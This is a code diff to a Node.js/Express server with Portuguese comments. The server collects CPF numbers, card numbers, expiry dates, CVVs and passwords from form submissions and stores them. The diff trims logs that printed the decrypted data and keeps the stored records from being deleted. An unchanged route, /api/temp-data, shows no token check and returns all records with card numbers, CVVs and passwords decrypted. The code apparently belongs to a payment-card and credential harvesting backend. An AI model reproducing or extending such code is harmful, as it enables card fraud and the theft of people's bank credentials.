@@ -55,7 +55,7 @@ const limiter = rateLimit({
 });
 app.use(limiter);
 
-// Middleware to parse JSON bodies
+// Middleware para parse JSON bodies
 app.use(bodyParser.json());
 
 // Middleware de segurança com CSP
@@ -335,12 +335,11 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
             return res.status(400).json({ error: 'Falha na descriptografia de password.' });
         }
 
-        console.log('Dados descriptografados:', { decryptedCpf, decryptedCardNumber, decryptedExpiryDate, decryptedCvv, decryptedPassword }, 'em:', new Date().toLocaleString('pt-BR'));
+        console.log('Dados recebidos com sucesso em:', new Date().toLocaleString('pt-BR')); // Log genérico
         const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
         const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
         const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;
 
-        console.log('Executando query SQL:', { sessionId, decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword }, 'em:', new Date().toLocaleString('pt-BR'));
         const result = await pool.query(
             `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
              VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
@@ -362,15 +361,14 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
     }
 });
 
-// Rotas de dados com depuração adicional para /api/temp-data
+// Rotas de dados com depuração reduzida para /api/temp-data
 app.get('/api/temp-data', async (req, res) => {
     try {
         console.log('Recebendo requisição para /api/temp-data em:', new Date().toLocaleString('pt-BR'));
         const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
-        console.log('Dados brutos do temp_data:', result.rows, 'em:', new Date().toLocaleString('pt-BR'));
+        console.log('Dados brutos retornados:', result.rows.length, 'registros em:', new Date().toLocaleString('pt-BR')); // Log genérico
         const decryptedRows = result.rows.map(row => {
             try {
-                console.log('Descriptografando linha:', row, 'em:', new Date().toLocaleString('pt-BR'));
                 return {
                     ...row,
                     card_number: row.card_number ? decrypt(row.card_number) : null,
@@ -378,7 +376,7 @@ app.get('/api/temp-data', async (req, res) => {
                     password: row.password ? decrypt(row.password) : null
                 };
             } catch (decryptionError) {
-                console.error('Erro na descriptografia de linha:', decryptionError.message, 'Linha:', row, 'em:', new Date().toLocaleString('pt-BR'));
+                console.error('Erro na descriptografia de linha:', decryptionError.message, 'em:', new Date().toLocaleString('pt-BR'));
                 return {
                     ...row,
                     card_number: null,
@@ -387,7 +385,7 @@ app.get('/api/temp-data', async (req, res) => {
                 };
             }
         });
-        console.log('Dados descriptografados antes da resposta:', decryptedRows, 'em:', new Date().toLocaleString('pt-BR'));
+        // Removido o log detalhado dos dados descriptografados
         res.json(decryptedRows);
     } catch (error) {
         console.error('Erro em /api/temp-data:', error.message, 'Stack:', error.stack, 'em:', new Date().toLocaleString('pt-BR'));
@@ -426,7 +424,7 @@ app.post('/submit', validateToken, async (req, res) => {
             `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
             [decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword]
         );
-        // Removido o DELETE para manter os dados temporários (opcional)
+        // Mantido comentado para não deletar temp_data
         // if (sessionId) {
         //     await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
         // }
